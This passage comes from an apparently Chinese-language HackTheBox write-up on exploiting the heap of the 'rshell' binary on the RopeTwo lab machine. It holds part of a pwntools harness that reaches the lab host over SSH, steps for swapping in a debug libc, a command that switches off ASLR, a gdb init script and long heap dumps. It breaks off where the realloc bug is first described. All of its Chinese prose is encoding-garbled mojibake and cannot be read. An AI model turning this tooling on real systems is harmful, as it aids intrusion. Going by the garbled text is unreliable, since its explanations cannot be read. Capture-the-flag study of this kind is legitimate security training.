class="line">        <span class="built_in">print</span>(line.decode())</span><br><span class="line"></span><br><span class="line">def add(name, size, content=<span class="string">&#x27;x&#x27;</span>):</span><br><span class="line">    p.sendline(f<span class="string">&#x27;add &#123;name&#125;&#x27;</span>)</span><br><span class="line">    res = p.recvuntil((<span class="string">&#x27;size: &#x27;</span>, prompt))</span><br><span class="line">    <span class="keyword">if</span> res.endswith(prompt.encode()): </span><br><span class="line">        pdb.set_trace()</span><br><span class="line">        <span class="built_in">return</span></span><br><span class="line">    p.sendline(f<span class="string">&#x27;&#123;size&#125;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> size &gt; 0:</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">        p.sendline(content)</span><br><span class="line">    res = p.recvuntil(prompt)</span><br><span class="line">    <span class="built_in">return</span> res </span><br><span class="line">    </span><br><span class="line">def rm(name, <span class="built_in">wait</span>=True):</span><br><span class="line">    p.sendline(f<span class="string">&#x27;rm &#123;name&#125;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">wait</span>:</span><br><span class="line">        p.recvuntil(prompt)</span><br><span class="line"></span><br><span class="line">def edit(name, size, content=<span class="string">&#x27;x&#x27;</span>):</span><br><span class="line">    p.sendline(f<span class="string">&#x27;edit &#123;name&#125;&#x27;</span>)</span><br><span class="line">    res = p.recvuntil((<span class="string">&#x27;size: &#x27;</span>, prompt))</span><br><span class="line">    <span class="keyword">if</span> res == prompt: </span><br><span class="line">        pdb.set_trace()</span><br><span class="line">        <span class="built_in">return</span></span><br><span class="line">    p.sendline(f<span class="string">&#x27;&#123;size&#125;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> size &gt; 0:</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">        p.send(content)</span><br><span class="line">    p.recvuntil(prompt)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rshell = ELF(<span class="string">&#x27;./rshell&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6-ropetwo&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.REMOTE:</span><br><span class="line">    remote = ssh(host=<span class="string">&#x27;10.10.10.196&#x27;</span>, user=<span class="string">&#x27;chromeuser&#x27;</span>, keyfile=<span class="string">&#x27;/root/keys/ed25519_gen&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.REMOTE:</span><br><span class="line">    p = remote.run(<span class="string">&#x27;rshell&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./rshell&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;$ &#x27;</span>)</span><br><span class="line">x=1</span><br></pre></td></tr></table></figure>

<ul>
<li>Libc</li>
</ul>
<p>ä½¿ç”¨ä¸RopeTwoç›¸åŒçš„libc</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chromeuser@rope2:~$ ldd /usr/bin/rshell</span><br><span class="line">        linux-vdso.so.1 (0x00007ffd1df75000)</span><br><span class="line">        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fbe10a9c000)</span><br><span class="line">        /lib64/ld-linux-x86-64.so.2 (0x00007fbe10c96000)</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨scpæ¥è·å–libc.so.6, (åœ¨æˆ‘çš„ä¸»æœºæŠŠå®ƒå‘½åä¸ºlibc.so.6-ropetwo)å’Œld-linux-x86-64.so.2ã€‚</p>
<p>æƒ³è¦libcçš„debugç¬¦å·ï¼Œæ‰€ä»¥ä½¿ç”¨ä¸<span class="exturl" data-url="aHR0cHM6Ly8weGRmLmdpdGxhYi5pby8yMDIwLzA2LzI3L2h0Yi1wbGF5ZXJ0d28uaHRtbCNmaXgtaGVhcGluZm8=">PlayerTwo<i class="fa fa-external-link-alt"></i></span>ç›¸åŒçš„è¿‡ç¨‹:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">â””â”€<span class="comment"># proxychains wget https://answers.launchpad.net/ubuntu/+source/glibc/2.29-0ubuntu2/+build/16599428/+files/libc6-dbg_2.29-0ubuntu2_amd64.deb</span></span><br><span class="line">[proxychains] config file found: /etc/proxychains.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.14</span><br><span class="line">--2021-02-17 15:53:59--  https://answers.launchpad.net/ubuntu/+<span class="built_in">source</span>/glibc/2.29-0ubuntu2/+build/16599428/+files/libc6-dbg_2.29-0ubuntu2_amd64.deb</span><br><span class="line">æ­£åœ¨è§£æä¸»æœº answers.launchpad.net (answers.launchpad.net)... 224.0.0.1</span><br><span class="line">æ­£åœ¨è¿æ¥ answers.launchpad.net (answers.launchpad.net)|224.0.0.1|:443... [proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  answers.launchpad.net:443  ...  OK</span><br><span class="line">å·²è¿æ¥ã€‚</span><br><span class="line">å·²å‘å‡º HTTP è¯·æ±‚ï¼Œæ­£åœ¨ç­‰å¾…å›åº”... 303 See Other</span><br><span class="line">ä½ç½®ï¼šhttps://launchpadlibrarian.net/418347029/libc6-dbg_2.29-0ubuntu2_amd64.deb [è·Ÿéšè‡³æ–°çš„ URL]</span><br><span class="line">--2021-02-17 15:54:03--  https://launchpadlibrarian.net/418347029/libc6-dbg_2.29-0ubuntu2_amd64.deb</span><br><span class="line">æ­£åœ¨è§£æä¸»æœº launchpadlibrarian.net (launchpadlibrarian.net)... 224.0.0.2</span><br><span class="line">æ­£åœ¨è¿æ¥ launchpadlibrarian.net (launchpadlibrarian.net)|224.0.0.2|:443... [proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  launchpadlibrarian.net:443  ...  OK</span><br><span class="line">å·²è¿æ¥ã€‚</span><br><span class="line">å·²å‘å‡º HTTP è¯·æ±‚ï¼Œæ­£åœ¨ç­‰å¾…å›åº”... 200 OK</span><br><span class="line">é•¿åº¦ï¼š5698988 (5.4M) [application/x-debian-package]</span><br><span class="line">æ­£åœ¨ä¿å­˜è‡³: â€œlibc6-dbg_2.29-0ubuntu2_amd64.debâ€</span><br><span class="line"></span><br><span class="line">libc6-dbg_2.29-0ubuntu2_amd64.deb  100%[===============================================================&gt;]   5.43M  1.96MB/s  ç”¨æ—¶ 2.8s    </span><br><span class="line"></span><br><span class="line">2021-02-17 15:54:09 (1.96 MB/s) - å·²ä¿å­˜ â€œlibc6-dbg_2.29-0ubuntu2_amd64.debâ€ [5698988/5698988])</span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">â””â”€<span class="comment"># dpkg --fsys-tarfile libc6-dbg_2.29-0ubuntu2_amd64.deb | tar xOf - ./usr/lib/debug/lib/x86_64-linux-gnu/libc-2.29.so &gt; libc-2.29.so</span></span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">â””â”€<span class="comment"># eu-unstrip libc.so.6-ropetwo libc-2.29.so</span></span><br><span class="line">â”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">â””â”€<span class="comment"># mv libc-2.29.so&#123;,-debug&#125;</span></span><br></pre></td></tr></table></figure>

<p>ç°åœ¨å°†ä½¿ç”¨patchelfå‘Šè¯‰rshellä½¿ç”¨è¿™äº›:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">â””â”€<span class="comment"># patchelf --set-interpreter ./ld-linux-x86-64.so.2 ./rshell</span></span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">â””â”€<span class="comment"># patchelf --replace-needed libc.so.6 ./libc-2.29.so-debug  ./rshell</span></span><br></pre></td></tr></table></figure>

<p>æœ¬åœ°rshellæ­£åœ¨ä½¿ç”¨è¿™ä¸¤ä¸ªåº“:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">â””â”€<span class="comment"># ldd rshell</span></span><br><span class="line">        linux-vdso.so.1 (0x00007ffc0cdee000)</span><br><span class="line">        ./libc-2.29.so-debug (0x00007f0e2ec0c000)</span><br><span class="line">        ./ld-linux-x86-64.so.2 =&gt; /lib64/ld-linux-x86-64.so.2 (0x00007f0e2ee00000)</span><br></pre></td></tr></table></figure>

<ul>
<li>gdb</li>
</ul>
<p>å¯¹äºåˆå§‹ç¯å¢ƒï¼Œåœ¨ä¸»æœºä¸Šè¿è¡Œ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>

<p>æ¥è½¬å‘ASLRã€‚è¿™å°†å…è®¸åœ¨æƒ³è¦çš„åœ°æ–¹æ”¾ä¸€ä¸ªæ–­ç‚¹ï¼Œè€Œä¸å¿…æ¯æ¬¡éƒ½è°ƒæ•´ã€‚</p>
<p>ä¸ºäº†è·Ÿè¸ªå †ï¼Œä½¿ç”¨<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Njd3VhcHR4L1B3bmdkYg==">Pwngdb<i class="fa fa-external-link-alt"></i></span>(ä¸è¦ä¸pwndbgæ··æ·†)ã€‚heapinfoå‘½ä»¤æ‰“å°å‡ºå„ç§freed binsçš„æ¼‚äº®è§†å›¾ã€‚</p>
<p>å°†æ‰€æœ‰è¿™äº›æ”¾åœ¨ä¸€èµ·ï¼Œä¸ºgdbåˆ›å»ºäº†ä»¥ä¸‹åˆå§‹åŒ–æ–‡ä»¶:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> pagination off</span><br><span class="line">b *0x0000555555555c2b</span><br><span class="line"><span class="built_in">command</span> 1</span><br><span class="line"><span class="built_in">echo</span> -----------------------------------\n</span><br><span class="line"><span class="built_in">set</span> <span class="variable">$cont1p</span> = *((long int*)0x555555558060)</span><br><span class="line"><span class="built_in">set</span> <span class="variable">$cont1</span> = *(char[]*)<span class="variable">$cont1p</span></span><br><span class="line"><span class="built_in">set</span> <span class="variable">$name1</span> = *(char[]*) 0x555555558068</span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;[0x%08x%08x] %-8s: %s\n&quot;</span>, <span class="variable">$cont1p</span> &gt;&gt; 32, <span class="variable">$cont1p</span>, <span class="variable">$name1</span>, <span class="variable">$cont1</span></span><br><span class="line"><span class="built_in">set</span> <span class="variable">$cont2p</span> = *((long int*)0x555555558130)</span><br><span class="line"><span class="built_in">set</span> <span class="variable">$cont2</span> = *(char[]*)<span class="variable">$cont2p</span></span><br><span class="line"><span class="built_in">set</span> <span class="variable">$name2</span> = *(char[]*) 0x555555558138</span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;[0x%08x%08x] %-8s: %s\n&quot;</span>, <span class="variable">$cont2p</span> &gt;&gt; 32, <span class="variable">$cont2p</span>, <span class="variable">$name2</span>, <span class="variable">$cont2</span></span><br><span class="line"><span class="built_in">echo</span> -----------------------------------\n</span><br><span class="line">x/48xg 0x55555555c2f0</span><br><span class="line"><span class="built_in">echo</span> -----------------------------------\n</span><br><span class="line">heapinfo</span><br><span class="line"><span class="built_in">continue</span></span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>è¿™å°†åœ¨è¯»å–ä¸‹ä¸€ä¸ªå‘½ä»¤ä¹‹å‰ï¼Œåœ¨0xc2bå¤„è®¾ç½®ä¸€ä¸ªæ–­ç‚¹ã€‚åœ¨è¿™ä¸ªæ–­ç‚¹å¤„ï¼Œå®ƒå°†è®¡ç®—å‡ºä¸¤ä¸ªæ–‡ä»¶çš„åç§°å’Œå†…å®¹ï¼Œå¹¶æ‰“å°ç»“æœã€‚ç„¶åï¼Œå®ƒå°†ä»å †ä¸­æ‰“å°48ä¸ªå•è¯åœ¨å·¥ä½œçš„åŒºåŸŸ(ç¡®å®ä¿®æ”¹äº†è¿™ä¸ªåœ°å€ï¼Œå› ä¸ºå…³æ³¨çš„æ˜¯å †çš„ä¸åŒéƒ¨åˆ†)ã€‚æœ€åï¼Œå®ƒå°†è¿è¡Œheapinfoæ¥æ˜¾ç¤ºbinsã€‚ç„¶åå®ƒä¼šç»§ç»­ã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼Œå¯ä»¥é€æ­¥éå†Pythonè„šæœ¬å¹¶ä»é‚£é‡Œè¿è¡Œå‡½æ•°ï¼Œgdbçª—å£å°†ç»§ç»­åœ¨æ¯ä¸ªå‘½ä»¤ä¹‹åæ‰“å°çŠ¶æ€ã€‚</p>
<p>ç¡®å®åœ¨~/.gdbinitæ–‡ä»¶ä¸­æ³¨é‡Šäº†Pedaçš„æ¥æºï¼Œå› ä¸ºæ— æ³•è®©å®ƒåœæ­¢åœ¨æ¯ä¸ªbreakä¸Šæ‰“å°ä¸Šä¸‹æ–‡ï¼Œè¿™ä¼šå°†æ­£åœ¨æ‰“å°çš„æ‰€æœ‰ä¿¡æ¯ä»å±å¹•ä¸Šåˆ é™¤ã€‚</p>
<h2 id="æ”¾åœ¨ä¸€èµ·"><a href="#æ”¾åœ¨ä¸€èµ·" class="headerlink" title="æ”¾åœ¨ä¸€èµ·"></a>æ”¾åœ¨ä¸€èµ·</h2><p>ç°åœ¨ï¼Œå¯åŠ¨Pythonè„šæœ¬ï¼ŒPythonè°ƒè¯•å™¨(pdb)è®¾ç½®ä¸ºåœæ­¢åœ¨æœ€åä¸€è¡Œï¼Œä»¥ä¾¿å¯ä»¥ç»§ç»­è¿è¡Œå‘½ä»¤:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">â””â”€<span class="comment"># python3 -mpdb -c &#x27;b 57&#x27; -c c exp.py</span></span><br><span class="line">Breakpoint 1 at /root/hackthebox/machine/rope2/exp.py:57</span><br><span class="line">[*] <span class="string">&#x27;/root/hackthebox/machine/rope2/rshell&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] <span class="string">&#x27;/root/hackthebox/machine/rope2/libc.so.6-ropetwo&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./rshell&#x27;</span>: pid 4649</span><br><span class="line">&gt; /root/hackthebox/machine/rope2/exp.py(57)&lt;module&gt;()</span><br><span class="line">-&gt; x=1</span><br><span class="line">(Pdb)</span><br></pre></td></tr></table></figure>

<p>ç°åœ¨åœ¨å¦ä¸€ä¸ªé¢æ¿ä¸­ï¼Œå°†é™„åŠ gdbï¼Œç„¶åå‘Šè¯‰å®ƒç»§ç»­:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">â””â”€<span class="comment"># gdb -q -p $(pidof rshell) --command=gdb-rshell.init</span></span><br><span class="line">Attaching to process 4649</span><br><span class="line">Reading symbols from /root/hackthebox/machine/rope2/rshell...</span><br><span class="line">(No debugging symbols found <span class="keyword">in</span> /root/hackthebox/machine/rope2/rshell)</span><br><span class="line">Reading symbols from ./libc-2.29.so-debug...</span><br><span class="line">Reading symbols from ./ld-linux-x86-64.so.2...</span><br><span class="line">(No debugging symbols found <span class="keyword">in</span> ./ld-linux-x86-64.so.2)</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0xfffffffffffffe00 </span><br><span class="line">RBX: 0x0 </span><br><span class="line">RCX: 0x7ffff7eebf81 (&lt;__GI___libc_read+17&gt;:     cmp    rax,0xfffffffffffff000)</span><br><span class="line">RDX: 0xc7 </span><br><span class="line">RSI: 0x7fffffffdf40 --&gt; 0x0 </span><br><span class="line">RDI: 0x0 </span><br><span class="line">RBP: 0x7fffffffe010 --&gt; 0x555555555c30 (push   r15)</span><br><span class="line">RSP: 0x7fffffffdf28 --&gt; 0x555555555bfa (mov    DWORD PTR [rbp-0xd4],eax)</span><br><span class="line">RIP: 0x7ffff7eebf81 (&lt;__GI___libc_read+17&gt;:     cmp    rax,0xfffffffffffff000)</span><br><span class="line">R8 : 0x2 </span><br><span class="line">R9 : 0x7ffff7fcb5c0 (0x00007ffff7fcb5c0)</span><br><span class="line">R10: 0x3 </span><br><span class="line">R11: 0x246 </span><br><span class="line">R12: 0x555555555150 (xor    ebp,ebp)</span><br><span class="line">R13: 0x7fffffffe0f0 --&gt; 0x1 </span><br><span class="line">R14: 0x0 </span><br><span class="line">R15: 0x0</span><br><span class="line">EFLAGS: 0x246 (carry PARITY adjust ZERO sign <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x7ffff7eebf7b &lt;__GI___libc_read+11&gt;:        jne    0x7ffff7eebf90 &lt;__GI___libc_read+32&gt;</span><br><span class="line">   0x7ffff7eebf7d &lt;__GI___libc_read+13&gt;:        xor    eax,eax</span><br><span class="line">   0x7ffff7eebf7f &lt;__GI___libc_read+15&gt;:        syscall </span><br><span class="line">=&gt; 0x7ffff7eebf81 &lt;__GI___libc_read+17&gt;:        cmp    rax,0xfffffffffffff000</span><br><span class="line">   0x7ffff7eebf87 &lt;__GI___libc_read+23&gt;:        ja     0x7ffff7eebfe0 &lt;__GI___libc_read+112&gt;</span><br><span class="line">   0x7ffff7eebf89 &lt;__GI___libc_read+25&gt;:        ret    </span><br><span class="line">   0x7ffff7eebf8a &lt;__GI___libc_read+26&gt;:        nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x7ffff7eebf90 &lt;__GI___libc_read+32&gt;:        push   r12</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fffffffdf28 --&gt; 0x555555555bfa (mov    DWORD PTR [rbp-0xd4],eax)</span><br><span class="line">0008| 0x7fffffffdf30 --&gt; 0x7ffff7ffeac0 --&gt; 0x7ffff7ffe9f0 --&gt; 0x7ffff7ffe758 --&gt; 0x7ffff7ffe730 --&gt; 0x7ffff7fd0000 (jg     0x7ffff7fd0047)</span><br><span class="line">0016| 0x7fffffffdf38 --&gt; 0x0 </span><br><span class="line">0024| 0x7fffffffdf40 --&gt; 0x0 </span><br><span class="line">0032| 0x7fffffffdf48 --&gt; 0x0 </span><br><span class="line">0040| 0x7fffffffdf50 --&gt; 0x0 </span><br><span class="line">0048| 0x7fffffffdf58 --&gt; 0x0 </span><br><span class="line">0056| 0x7fffffffdf60 --&gt; 0x0 </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x00007ffff7eebf81 <span class="keyword">in</span> __GI___libc_read (fd=0x0, buf=0x7fffffffdf40, nbytes=0xc7) at ../sysdeps/unix/sysv/linux/read.c:26</span><br><span class="line">26      ../sysdeps/unix/sysv/linux/read.c: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•.</span><br><span class="line">Breakpoint 1 at 0x555555555c2b</span><br></pre></td></tr></table></figure>

<p>å½“æ·»åŠ ä¸€ä¸ªæ–‡ä»¶:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(Pdb) add(<span class="string">&#x27;test&#x27;</span>, 0x60, <span class="string">&#x27;this is a test&#x27;</span>) </span><br><span class="line">b<span class="string">&#x27;$ &#x27;</span></span><br><span class="line">(Pdb)</span><br></pre></td></tr></table></figure>

<p>gdbæ›´æ–°ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">[0x000055555555b260] <span class="built_in">test</span>    : this is a <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line">[0x0000000000000000]         : (null)</span><br><span class="line">-----------------------------------</span><br><span class="line">0x55555555c2f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c300: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c310: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c320: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c330: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c340: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c350: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c360: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c370: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c380: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c390: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c3a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c3b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c3c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c3d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c3e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c3f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c400: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c410: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c420: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c430: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c440: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c450: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c460: 0x0000000000000000      0x0000000000000000</span><br><span class="line">-----------------------------------</span><br><span class="line">(0x20)     fastbin[0]: 0x0</span><br><span class="line">(0x30)     fastbin[1]: 0x0                                                                                                                 </span><br><span class="line">(0x40)     fastbin[2]: 0x0                                                                                                                 </span><br><span class="line">(0x50)     fastbin[3]: 0x0                                                                                                                 </span><br><span class="line">(0x60)     fastbin[4]: 0x0                                                                                                                 </span><br><span class="line">(0x70)     fastbin[5]: 0x0                                                                                                                 </span><br><span class="line">(0x80)     fastbin[6]: 0x0                                                                                                                 </span><br><span class="line">(0x90)     fastbin[7]: 0x0                                                                                                                 </span><br><span class="line">(0xa0)     fastbin[8]: 0x0                                                                                                                 </span><br><span class="line">(0xb0)     fastbin[9]: 0x0                                                                                                                 </span><br><span class="line">                  top: 0x55555555b2c0 (size : 0x20d40)                                                                                     </span><br><span class="line">       last_remainder: 0x0 (size : 0x0)                                                                                                    </span><br><span class="line">            unsortbin: 0x0</span><br></pre></td></tr></table></figure>

<h2 id="æ³¨é‡Š"><a href="#æ³¨é‡Š" class="headerlink" title="æ³¨é‡Š"></a>æ³¨é‡Š</h2><p>å¼€å‘è¿™ç§æ¼æ´åˆ©ç”¨ç¨‹åºå¤ªç–¯ç‹‚äº†ã€‚æ¯æ¬¡è¿›å…¥ä¸‹ä¸€ä¸ªæ­¥éª¤æ—¶ï¼Œéƒ½å¿…é¡»è¿”å›å¹¶å®Œå…¨é‡æ–°æ„å»ºå‰ä¸€ä¸ªï¼Œç§»åŠ¨æ–¹å—ï¼Œå°è¯•ä¸åŒå¤§å°çš„binsã€‚ä¸å¯èƒ½åœ¨æœ¬æ–‡ä¸­å±•ç¤ºæ‰€æœ‰è¿™äº›æ­¥éª¤ï¼Œä½†æ˜¯ï¼Œå°†å°è¯•åœ¨å®Œæˆçš„è„šæœ¬ä¸­å®Œæˆä¸åŒçš„ç›®æ ‡ï¼Œå¹¶å±•ç¤ºå¦‚ä½•ä½¿ç”¨è„šæœ¬æ“ä½œå †æ¥å®Œæˆæ‰€éœ€è¦çš„ä»»åŠ¡ã€‚ä½†æ˜¯å€¼å¾—è¡¥å……çš„æ˜¯ï¼Œå½“ç¬¬ä¸€æ¬¡åœ¨å †ä¸Šè·å¾—libcåœ°å€æ—¶ï¼Œä»£ç çœ‹èµ·æ¥å®Œå…¨ä¸åŒã€‚å½“è¿›å…¥ä¸‹ä¸€ä¸ªæ­¥éª¤æ—¶ï¼Œå°†ä½¿ç”¨ç›¸åŒçš„é€šç”¨æŠ€æœ¯ï¼Œä½†éœ€è¦å®Œå…¨é‡æ–°è®¾è®¡ä¸åŒbinsçš„é—´è·å’Œå¤§å°ï¼Œä»¥å®Œæˆå·²ç»å®ç°çš„ç›®æ ‡å’Œä¸‹ä¸€ä¸ªç›®æ ‡ã€‚</p>
<h2 id="å¼±ç‚¹"><a href="#å¼±ç‚¹" class="headerlink" title="å¼±ç‚¹"></a>å¼±ç‚¹</h2><ul>
<li>æè¿°</li>
</ul>
<p>è¿™é‡Œçš„æ¼æ´åœ¨äºç¼–è¾‘å‘½ä»¤ä¸­çš„reallocï¼Œä»¥åŠå®ƒå¦‚ä½•æ ¹æ®å½“å‰å¤§å°å’Œæ–°å¤§å°åšå‡ºååº”:</p>
<table>
<thead>
<tr>
